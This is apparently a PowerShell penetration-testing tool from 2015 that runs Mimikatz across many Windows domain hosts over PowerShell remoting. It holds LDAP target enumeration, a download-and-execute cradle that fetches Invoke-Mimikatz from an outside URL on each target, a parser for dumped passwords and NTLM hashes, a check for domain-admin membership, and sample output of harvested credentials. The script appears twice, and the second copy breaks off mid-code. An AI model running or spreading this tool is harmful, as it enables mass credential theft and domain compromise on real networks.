<#

Script mod author
    Scott Sutherland (@_nullbind), 2015 NetSPI

Description
    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.  
    Since there is 8k limit its possible to pass invoke-mimikatz to the target systems without reflection.
    Features/credits:
     - Idea: rob, will, and carlos
	 - Input: Accepts host from pipeline (will's code)
	 - Input: Accepts host list from file (will's code)
	 - AutoTarget option will lookup domain computers from DC (carlos's code)
	 - Ability to filter by OS (scott's code)
	 - Ability to only target domain systems with WinRm installed (vai SPNs) (scott's code)
	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
	 - More descriptive verbose error messages (scott's code)
	 - Ability to specify alternative credentials and connect from a non-domain system (carlos's code)
	 - Runs mimikatz on target system using Joseph's/Matt's/benjamin's code)
     - Parse mimiaktz output (will's code)
	 - Returns enumerated credentials in a datable which can be used in the pipeline (scott's code)
	 
Notes
    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
    Returns data table object to pipeline with creds.
    Weee PowerShell.

Command Examples

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”

     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 

Output Sample 1

    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Found 1 servers that met search criteria.
    VERBOSE: Attempting to create 1 ps sessions...
    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Unknown         Unknown    
    test.domain administrator MyEAPassword!                    Unknown         Unknown    
    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       

Output Sample 2

PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Getting list of Servers from DC...
    VERBOSE: Getting list of Enterprise and Domain Admins...
    VERBOSE: Found 3 servers that met search criteria.
    VERBOSE: Attempting to create 3 ps sessions...
    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Yes             Yes    
    test.domain administrator MyEAPassword!                    Yes             Yes     
    test        myadmin       MyDAPAssword!                    No              Yes     
    test.domain myadmin       MyDAPAssword!                    No              Yes 
    test        myuser        MyUserPAssword!                  No              No
    test.domain myuser        MyUSerPAssword!                  No              No                


Todo
    fix parsing so password hashes show up differently.
    prettify
    help updates

References
	https://github.com/gentilkiwi/mimikatz
	https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
	https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz
	https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
	http://blogs.technet.com/b/heyscriptingguy/archive/2009/10/29/hey-scripting-guy-october-29-2009.aspx
#>
function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Position=0,ValueFromPipeline=$true,
        HelpMessage="This can be use to provide a list of host.")]
        [String[]]
        $Hosts,

        [Parameter(Mandatory=$false,
        HelpMessage="This should be a path to a file containing a host list.  Once per line")]
        [String]
        $HostList,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.  Only used with -autotarget.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services. Only used with -autotarget.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="This get a list of computer from ADS withthe applied filters.")]
        [switch]$AutoTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )

        # Setup initial authentication, adsi, and functions
        Begin
        {
            if ($DomainController -and $Credential.GetNetworkCredential().Password)
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }
            else
            {
                $objDomain = [ADSI]""  
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }


            # ----------------------------------------
            # Setup required data tables
            # ----------------------------------------

            # Create data table to house results to return
            $TblPasswordList = New-Object System.Data.DataTable 
            $TblPasswordList.Columns.Add("Type") | Out-Null
            $TblPasswordList.Columns.Add("Domain") | Out-Null
            $TblPasswordList.Columns.Add("Username") | Out-Null
            $TblPasswordList.Columns.Add("Password") | Out-Null  
            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
            $TblPasswordList.Clear()

             # Create data table to house results
            $TblServers = New-Object System.Data.DataTable 
            $TblServers.Columns.Add("ComputerName") | Out-Null


            # ----------------------------------------
            # Function to grab domain computers
            # ----------------------------------------
            function Get-DomainComputers
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by the provided operating system. Default is all.")]
                    [string]$OsFilter = "*",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by only include servers with registered winrm services.")]
                    [switch]$WinRM,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]

                    [string]$SearchDN
                )

                Write-verbose "Getting list of Servers from DC..."

                # Get domain computers from dc 
                if ($OsFilter -eq "*"){
                    $OsCompFilter = "(operatingsystem=*)"
                }else{
                    $OsCompFilter = "(operatingsystem=*$OsFilter*)"
                }

                # Select winrm spns if flagged
                if($WinRM){
                    $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
                }else{
                    $winrmComFilter = ""
                }

                $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
                $ObjSearcher.PageSize = $Limit
                $ObjSearcher.Filter = $CompFilter
                $ObjSearcher.SearchScope = "Subtree"

                if ($SearchDN)
                {
                    $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
                }

                $ObjSearcher.FindAll() | ForEach-Object {
            
                    #add server to data table
                    $ComputerName = [string]$_.properties.dnshostname                    
                    $TblServers.Rows.Add($ComputerName) | Out-Null 
                }
            }

            # ----------------------------------------
            # Function to check group membership 
            # ----------------------------------------        
            function Get-GroupMember
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [string]$Group = "Domain Admins",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]
                    [string]$SearchDN
                )
  
                if ($DomainController -and $Credential.GetNetworkCredential().Password)
                   {
                        $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
                        $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
                    else
                    {
                        $root = ([ADSI]"").distinguishedName
                        $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
        
                    # Create data table to house results to return
                    $TblMembers = New-Object System.Data.DataTable 
                    $TblMembers.Columns.Add("GroupMember") | Out-Null 
                    $TblMembers.Clear()

                    $objDomain.member | %{                    
                        $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
                }

                return $TblMembers
            }

            # ----------------------------------------
            # Mimikatz parse function (Will Schoeder's) 
            # ----------------------------------------

            # This is a *very slightly mod version of will schroeder's function from:
            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
            function Parse-Mimikatz {

                [CmdletBinding()]
                param(
                    [string]$raw
                )
    
                # Create data table to house results
                $TblPasswords = New-Object System.Data.DataTable 
                $TblPasswords.Columns.Add("PwType") | Out-Null
                $TblPasswords.Columns.Add("Domain") | Out-Null
                $TblPasswords.Columns.Add("Username") | Out-Null
                $TblPasswords.Columns.Add("Password") | Out-Null    

                # msv
	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("NTLM")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "msv"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/tspkg"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/kerberos"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "kerberos/ssp"
                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }

                # Remove the computer accounts
                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}

                return $TblPasswords_Clean
            }

            # ----------------------------------------
            # original invoke-mimikatz
            # ----------------------------------------




        }

        # Conduct attack
        Process 
        {

            # ----------------------------------------
            # Compile list of target systems
            # ----------------------------------------

            # Get list of systems from the command line / pipeline            
            if ($Hosts)
            {
                Write-verbose "Getting list of Servers from provided hosts..."
                $Hosts | 
                %{ 
                    $TblServers.Rows.Add($_) | Out-Null 
                }
            }

            # Get list of systems from the command line / pipeline
            if($HostList){
                Write-verbose "Getting list of Servers $HostList..."                
                if (Test-Path -Path $HostList){
                    $HostListHosts += Get-Content -Path $HostList
                    $HostListHosts|
                    %{
                        $TblServers.Rows.Add($_) | Out-Null
                    }
                }else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                }            
            }

            # Get list of domain systems from dc and add to the server list
            if ($AutoTarget)
            {
                if ($OsFilter){
                    $FlagOsFilter = "$OsFilter"
                }else{
                    $FlagOsFilter = "*"
                }


                if ($WinRM){
                    Get-DomainComputers -WinRM -OsFilter $OsFilter
                }else{
                    Get-DomainComputers -OsFilter $OsFilter
                }
            }


            # ----------------------------------------
            # Get list of entrprise/domain admins
            # ----------------------------------------
            if ($AutoTarget)
            {
                Write-Verbose "Getting list of Enterprise and Domain Admins..."
                if ($DomainController -and $Credential.GetNetworkCredential().Password)            
                {           
                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
                }else{

                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                }
            }


            # ----------------------------------------
            # Establish sessions
            # ---------------------------------------- 
            $ServerCount = $TblServers.Rows.Count

            if($ServerCount -eq 0){
                Write-Verbose "No target systems were provided."
                break
            }

            # Fix incase servers in list are less than maxhosts
            if($ServerCount -lt $MaxHosts){
                $MaxHosts = $ServerCount
            }

            Write-Verbose "Found $ServerCount servers that met search criteria."            
            Write-verbose "Attempting to create $MaxHosts ps sessions..."

            # Set counters
            $ServerCounter = 0     
            $SessionCount = 0   

            $TblServers | 
            ForEach-Object {
                if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
                    
                    $ServerCounter = $ServerCounter+1
                   
                    # attempt session
                    [string]$MyComputer = $_.ComputerName                        
                    New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
                    # Get session count
                    $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
                    Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $ServerCounter of $ServerCount - $MyComputer"         
                    
                }
            }  
            
                        
            # ---------------------------------------------
            # Attempt to run mimikatz against open sessions
            # ---------------------------------------------
            if($SessionCount -ge 1){

                # run the mimikatz command
                Write-verbose "Running Mimikatz against $SessionCount open ps sessions..."
                $x = Get-PSSession
                [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
                $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                $TblResults | foreach {
            
                    [string]$pwtype = $_.pwtype.ToLower()
                    [string]$pwdomain = $_.domain.ToLower()
                    [string]$pwusername = $_.username.ToLower()
                    [string]$pwpassword = $_.password
                    
                    # Check if user has da/ea privs - requires autotarget
                    if ($AutoTarget)
                    {
                        $ea = "No"
                        $da = "No"

                        # Check if user is enterprise admin                   
                        $EnterpriseAdmins |
                        ForEach-Object {
                            $EaUser = $_.GroupMember
                            if ($EaUser -eq $pwusername){
                                $ea = "Yes"
                            }
                        }
                    
                        # Check if user is domain admin
                        $DomainAdmins |
                        ForEach-Object {
                            $DaUser = $_.GroupMember
                            if ($DaUser -eq $pwusername){
                                $da = "Yes"
                            }
                        }
                    }else{
                        $ea = "Unknown"
                        $da = "Unknown"
                    }

                    # Add credential to list
                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
                }            

                # remove sessions
                Write-verbose "Removing ps sessions..."
                Disconnect-PSSession -Session $x | Out-Null
                Remove-PSSession -Session $x | Out-Null

            }else{
                Write-verbose "No ps sessions could be created."
            }                 
        }

        # Clean and results
        End
        {
                # Clear server list
                $TblServers.Clear()

                # Return passwords
                if ($TblPasswordList.row.count -eq 0){
                    Write-Verbose "No credentials were recovered."
                    Write-Verbose "Done."
                }else{
                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }
    <#

Script mod author
    Scott Sutherland (@_nullbind), 2015 NetSPI

Description
    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
    Features/credits:
    	 - Idea: rob, will, and carlos
	 - Input: Accepts host from pipeline (will's code)
	 - Input: Accepts host list from file (will's code)
	 - AutoTarget option will lookup domain computers from DC (carlos's code)
	 - Ability to filter by OS (scott's code)
	 - Ability to only target domain systems with WinRm installed (vai SPNs) (scott's code)
	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
	 - More descriptive verbose error messages (scott's code)
	 - Ability to specify alternative credentials and connect from a non-domain system (carlos's code)
	 - Runs mimikatz on target system using ie/download/execute cradle (chris's, Joseph's, Matt's, and benjamin's code)
	 - Parses mimikatz output (will's code)
	 - Returns enumerated credentials in a data table which can be used in the pipeline (scott's code)
	 
Notes
    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
    Returns data table object to pipeline with creds.
    Weee PowerShell.

Command Examples

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”

     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 

Output Sample 1

    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Found 1 servers that met search criteria.
    VERBOSE: Attempting to create 1 ps sessions...
    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Unknown         Unknown    
    test.domain administrator MyEAPassword!                    Unknown         Unknown    
    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       

Output Sample 2

PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Getting list of Servers from DC...
    VERBOSE: Getting list of Enterprise and Domain Admins...
    VERBOSE: Found 3 servers that met search criteria.
    VERBOSE: Attempting to create 3 ps sessions...
    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Yes             Yes    
    test.domain administrator MyEAPassword!                    Yes             Yes     
    test        myadmin       MyDAPAssword!                    No              Yes     
    test.domain myadmin       MyDAPAssword!                    No              Yes 
    test        myuser        MyUserPAssword!                  No              No
    test.domain myuser        MyUSerPAssword!                  No              No                


Todo
    fix loop
    fix parsing so password hashes show up differently.
    fix psurl
    add will's / obscuresec's self-serv mimikatz file option

References
	pending

#>
function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Position=0,ValueFromPipeline=$true,
        HelpMessage="This can be use to provide a list of host.")]
        [String[]]
        $Hosts,

        [Parameter(Mandatory=$false,
        HelpMessage="This should be a path to a file containing a host list.  Once per line")]
        [String]
        $HostList,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.  Only used with -autotarget.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services. Only used with -autotarget.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="This get a list of computer from ADS withthe applied filters.")]
        [switch]$AutoTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )

        # Setup initial authentication, adsi, and functions
        Begin
        {
            if ($DomainController -and $Credential.GetNetworkCredential().Password)
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }
            else
            {
                $objDomain = [ADSI]""  
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }


            # ----------------------------------------
            # Setup required data tables
            # ----------------------------------------

            # Create data table to house results to return
            $TblPasswordList = New-Object System.Data.DataTable 
            $TblPasswordList.Columns.Add("Type") | Out-Null
            $TblPasswordList.Columns.Add("Domain") | Out-Null
            $TblPasswordList.Columns.Add("Username") | Out-Null
            $TblPasswordList.Columns.Add("Password") | Out-Null  
            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
            $TblPasswordList.Clear()

             # Create data table to house results
            $TblServers = New-Object System.Data.DataTable 
            $TblServers.Columns.Add("ComputerName") | Out-Null


            # ----------------------------------------
            # Function to grab domain computers
            # ----------------------------------------
            function Get-DomainComputers
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
